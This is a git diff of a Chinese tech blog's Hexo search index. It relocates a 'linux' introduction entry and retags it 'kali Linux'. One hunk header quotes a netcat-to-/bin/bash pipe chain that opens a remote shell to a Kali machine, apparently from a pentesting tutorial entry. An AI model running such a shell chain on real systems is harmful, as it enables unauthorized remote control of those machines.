@@ -1,29 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>linux</title>
-    <url>/2022/08/12/linux/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
-<blockquote>
-<p>Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。</p>
-</blockquote>
-</blockquote>
-<p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p>
-<p>Linux 能运行主要的 UNIX 工具软件、应用程序和网络协议。它支持 32 位和 64 位硬件。Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
-<pre class=" language-bash"><code class="language-bash">$ hexo server
-</code></pre>
-<p><img src="https://t7.baidu.com/it/u=3930750564,2979238085&fm=193&f=GIF" alt="这是封面"></p>
-<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2F4k%2Fs%2F02%2F210924223450D25-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1662899151&t=c4b3dc1cbeb0fff8b0988f565417991e" alt="看看这个能成功不"></p>
-<div id="dplayer0" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer0 = new DPlayer({"element":document.getElementById("dplayer0"),"autoplay":0,"theme":"#FADFA3","loop":1,"video":{"url":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.mp4","pic":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.jpg"},"danmaku":{"api":"https://api.prprpr.me/dplayer3/","id":"9E2E3368B56CDBB4","token":"tokendemo","addition":["https://api.prprpr.me/dplayer3/v2/bilibili?aid"]}});</script><!-- dplayer used1 -->  
-<div id="dplayer1" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer1 = new DPlayer({"element":document.getElementById("dplayer1"),"autoplay":1,"video":{"url":"some.mp4"},"danmaku":{"api":"https://api.prprpr.me/dplayer/","id":"someid","addition":["/some.json"]}});</script><!-- dplayer used1 -->]]></content>
-      <categories>
-        <category>系统</category>
-      </categories>
-      <tags>
-        <tag>操作系统</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>wireshark抓包新手使用教程</title>
     <url>/2023/05/24/wireshark-zhua-bao-xin-shou-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1、wireshark启动后，wireshark处于抓包状态中。</p>
@@ -205,6 +182,29 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </categories>
       <tags>
         <tag>编程语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux</title>
+    <url>/2022/08/12/linux/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<blockquote>
+<p>Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。</p>
+</blockquote>
+</blockquote>
+<p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p>
+<p>Linux 能运行主要的 UNIX 工具软件、应用程序和网络协议。它支持 32 位和 64 位硬件。Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
+<pre class=" language-bash"><code class="language-bash">$ hexo server
+</code></pre>
+<p><img src="https://t7.baidu.com/it/u=3930750564,2979238085&fm=193&f=GIF" alt="这是封面"></p>
+<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2F4k%2Fs%2F02%2F210924223450D25-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1662899151&t=c4b3dc1cbeb0fff8b0988f565417991e" alt="看看这个能成功不"></p>
+<div id="dplayer0" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer0 = new DPlayer({"element":document.getElementById("dplayer0"),"autoplay":0,"theme":"#FADFA3","loop":1,"video":{"url":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.mp4","pic":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.jpg"},"danmaku":{"api":"https://api.prprpr.me/dplayer3/","id":"9E2E3368B56CDBB4","token":"tokendemo","addition":["https://api.prprpr.me/dplayer3/v2/bilibili?aid"]}});</script><!-- dplayer used1 -->  
+<div id="dplayer1" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer1 = new DPlayer({"element":document.getElementById("dplayer1"),"autoplay":1,"video":{"url":"some.mp4"},"danmaku":{"api":"https://api.prprpr.me/dplayer/","id":"someid","addition":["/some.json"]}});</script><!-- dplayer used1 -->]]></content>
+      <categories>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>kali Linux</tag>
       </tags>
   </entry>
 </search>
